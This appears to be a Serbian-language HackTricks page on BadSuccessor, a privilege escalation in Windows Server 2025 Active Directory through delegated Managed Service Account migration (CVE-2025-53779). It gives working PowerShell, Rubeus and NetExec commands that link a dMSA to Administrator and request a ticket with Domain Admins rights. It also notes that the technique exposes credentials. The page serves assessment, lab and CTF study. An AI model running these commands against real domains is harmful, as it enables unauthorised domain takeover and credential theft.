# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

**BadSuccessor** zloupotrebljava workflow migracije **delegated Managed Service Account** (**dMSA**), uveden u **Windows Server 2025**. dMSA može biti povezan sa legacy nalogom putem **`msDS-ManagedAccountPrecededByLink`** i premešten kroz stanja migracije sačuvana u **`msDS-DelegatedMSAState`**. Ako napadač može da kreira dMSA u OU nad kojim ima pravo upisa i kontroliše te atribute, KDC može da izda tickets za dMSA pod kontrolom napadača, sa **authorization context**-om povezanog naloga.<sup>[[2]](#references)</sup>

U praksi, to znači da korisnik sa niskim privilegijama, koji ima samo delegirana prava nad OU-om, može da kreira novi dMSA, usmeri ga na `Administrator`, dovrši stanje migracije i zatim dobije TGT čiji PAC sadrži privilegovane grupe kao što je **Domain Admins**.<sup>[[2]](#references)</sup>

## Detalji dMSA migracije koji su važni

- dMSA je funkcija **Windows Server 2025**.
- `Start-ADServiceAccountMigration` postavlja migraciju u stanje **started**.
- `Complete-ADServiceAccountMigration` postavlja migraciju u stanje **completed**.
- `msDS-DelegatedMSAState = 1` znači da je migracija započeta.
- `msDS-DelegatedMSAState = 2` znači da je migracija dovršena.
- Tokom legitimne migracije, dMSA treba transparentno da zameni superseded nalog, tako da KDC/LSA očuvaju pristup koji je prethodni nalog već imao.<sup>[[3]](#references)</sup>

Microsoft Learn takođe navodi da se tokom migracije originalni nalog povezuje sa dMSA nalogom i da dMSA treba da ima pristup onome čemu je stari nalog mogao da pristupi.<sup>[[3]](#references)</sup> To je security pretpostavka koju BadSuccessor zloupotrebljava.<sup>[[2]](#references)</sup>

## Zahtevi

1. Domen u kom postoji **dMSA**, što znači da je na AD strani prisutna podrška za **Windows Server 2025**.
2. Napadač može da **kreira** objekte tipa `msDS-DelegatedManagedServiceAccount` u nekom OU-u ili tamo ima ekvivalentna široka prava za kreiranje child objekata.
3. Napadač može da **upisuje** relevantne dMSA atribute ili ima potpunu kontrolu nad dMSA nalogom koji je upravo kreirao.
4. Napadač može da zahteva Kerberos tickets iz konteksta pridruženog domenu ili putem tunnel-a koji doseže LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Praktične provere

Najčistiji operator signal jeste provera nivoa domena/foresta i potvrda da okruženje već koristi novi Server 2025 stack:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Ako vidite vrednosti kao što su `Windows2025Domain` i `Windows2025Forest`, tretirajte **BadSuccessor / dMSA migration abuse** kao prioritetnu proveru.

Takođe možete enumerisati OUs sa pravom upisa, kojima je delegirano kreiranje dMSA naloga, pomoću javno dostupnih alata:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Tok zloupotrebe

1. Kreirajte dMSA u OU-u u kojem imate delegirana prava za kreiranje child objekata.
2. Podesite **`msDS-ManagedAccountPrecededByLink`** na DN privilegovanog cilja, kao što je `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Podesite **`msDS-DelegatedMSAState`** na `2` da biste označili migraciju kao završenu.
4. Zatražite TGT za novi dMSA i koristite dobijenu kartu za pristup privilegovanim servisima.<sup>[[2]](#references)</sup>

PowerShell primer:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Primeri zahteva za ticket / operativne alate:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Zašto je ovo više od privilege escalation

Tokom legitimne migracije, Windows takođe mora da omogući novom dMSA-u obradu ticket-a izdatih za prethodni nalog pre prebacivanja. Zato materijal vezan za dMSA ticket-e može da sadrži **trenutne** i **prethodne** ključeve u okviru toka **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

U slučaju lažne migracije pod kontrolom napadača, takvo ponašanje može pretvoriti BadSuccessor u:<sup>[[2]](#references)</sup>

- **Privilege escalation** nasleđivanjem SID-ova privilegovanih grupa u PAC-u.
- **Izlaganje credential materijala** zato što obrada prethodnog ključa može izložiti materijal ekvivalentan RC4/NT hash-u prethodnika u ranjivim workflow-ima.

Zbog toga je ova tehnika korisna i za direktno preuzimanje domena i za naknadne operacije kao što su pass-the-hash ili šira kompromitacija credential-a.

## Napomene o statusu patch-a

Originalno BadSuccessor ponašanje **nije samo teoretski problem iz preview verzije za 2025. godinu**. Microsoft mu je dodelio **CVE-2025-53779** i objavio security update u **avgustu 2025.**<sup>[[4]](#references)</sup> Ovu tehniku treba dokumentovati za:

- **labove / CTF-ove / assume-breach vežbe**
- **nepatchovana Windows Server 2025 okruženja**
- **proveru OU delegacija i izloženosti dMSA-a tokom assessment-a**

Ne pretpostavljajte da je Windows Server 2025 domen ranjiv samo zato što postoji dMSA; proverite patch level i pažljivo testirajte.

## Alatke

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Reference

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
